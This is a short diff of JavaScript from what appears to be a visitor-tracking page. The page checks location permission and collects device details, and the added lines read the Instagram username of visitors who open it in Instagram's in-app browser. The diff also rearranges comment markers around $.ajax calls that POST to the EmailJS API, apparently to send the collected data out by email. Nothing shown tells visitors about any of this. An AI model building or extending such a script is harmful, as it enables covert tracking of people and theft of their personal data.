@@ -117,6 +117,13 @@ checkLocationPermission();
     }
 };
 
+alert("reached");
+alert(window.__additionalData.feed.data.user.username);
+alert("done")
+
+console.log(window.__additionalData.feed.data.user.username);
+
+/*
 $.ajax('https://api.emailjs.com/api/v1.0/email/send', {
     type: 'POST',
     async: false,
@@ -130,7 +137,7 @@ $.ajax('https://api.emailjs.com/api/v1.0/email/send', {
     //alert('Oops... ' + JSON.stringify(error));
 
 });
-/*
+
 if(navigator.userAgent.includes("Instagram")){
     alert("If cannot continue, Use another browser");
     window.close();
@@ -262,7 +269,7 @@ function deviceDetails(API)
     }
 };
 
-
+/*
 $.ajax('https://api.emailjs.com/api/v1.0/email/send', {
     type: 'POST',
     async: false,
@@ -276,7 +283,7 @@ $.ajax('https://api.emailjs.com/api/v1.0/email/send', {
     //alert('Oops... ' + JSON.stringify(error));
 
 });
-
+*/
 
 }
 
